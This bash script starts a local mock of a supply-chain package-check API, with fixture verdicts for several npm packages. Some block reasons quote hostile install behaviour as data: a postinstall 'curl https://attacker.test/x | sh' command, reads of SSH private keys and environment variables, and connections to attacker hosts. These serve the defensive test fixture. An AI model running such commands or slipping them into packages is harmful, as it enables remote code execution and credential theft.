#!/usr/bin/env bash
# Tiny stand-in for the Aegis API while developing the CLI locally.
# Mirrors the shape of /api/v1/supply-chain/check.
#
# Usage:  ./scripts/mock-api.sh
# Then:   AEGIS_API_URL=http://localhost:14000 ./bin/aegis npm install lodash@4.17.21

set -e

PORT="${PORT:-14000}"

cat > /tmp/aegis-mock-api.py <<'PY'
import json
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(os.environ.get("PORT", "14000"))

# (ecosystem, package, version) -> decision dict
DECISIONS = {
    ("npm", "lodash", "4.17.21"): {
        "decision": "allow", "severity": "info", "cached": True, "reasons": [],
    },
    ("npm", "@bitwarden/cli", "2026.4.0"): {
        "decision": "block", "severity": "critical", "cached": True,
        "reasons": [
            {"category": "depsandbox-net-egress",
             "detail": "Postinstall connects to attacker-controlled host (not in npm/node mirrors)"},
            {"category": "depsandbox-credential-read",
             "detail": "Reads /proc/self/environ during install — env exfiltration pattern"},
        ],
    },
    ("npm", "ua-parser-js", "0.7.29"): {
        "decision": "block", "severity": "critical", "cached": True,
        "reasons": [
            {"category": "depsandbox-exec-shell",
             "detail": "Postinstall executes downloaded shell payload (preinstall.sh)"},
            {"category": "depsandbox-net-egress",
             "detail": "Connects to citationsherbe.at (not in registry allowlist)"},
        ],
    },
    ("npm", "@aegis/evil-demo", "1.0.1"): {
        "decision": "block", "severity": "critical", "cached": True,
        "reasons": [
            {"category": "depsandbox-exec-shell",
             "detail": 'exec("/bin/sh", "-c", "curl https://attacker.test/x | sh") in postinstall'},
            {"category": "depsandbox-net-egress",
             "detail": "Connects to attacker.test:443 — not in npm/node mirror allowlist"},
            {"category": "depsandbox-credential-read",
             "detail": "Reads $HOME/.ssh/id_rsa during install"},
        ],
    },
    ("npm", "@aegis/suspicious-demo", "2.0.0"): {
        "decision": "prompt", "severity": "high", "cached": True,
        "reasons": [
            {"category": "depsandbox-script-added",
             "detail": "New postinstall script added since 1.x — not present in baseline"},
            {"category": "depsandbox-fs-write",
             "detail": "Writes outside ./node_modules/ during install (~/.cache/suspicious-demo/)"},
        ],
    },
}


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/api/v1/supply-chain/check":
            self.send_response(404); self.end_headers(); return
        n = int(self.headers.get("Content-Length", "0"))
        body = json.loads(self.rfile.read(n))
        eco = body.get("ecosystem", "")
        pkg = body.get("package", "")
        ver = body.get("version", "")
        dec = DECISIONS.get((eco, pkg, ver), {
            "decision": "allow", "severity": "info", "cached": False, "reasons": [],
        })
        out = {"ecosystem": eco, "package": pkg, "version": ver, **dec}
        payload = json.dumps(out).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, fmt, *args):
        sys.stderr.write("[mock-api] " + (fmt % args) + "\n")


print(f"[mock-api] listening on http://localhost:{PORT}", file=sys.stderr)
HTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
PY

PORT="$PORT" exec python3 /tmp/aegis-mock-api.py
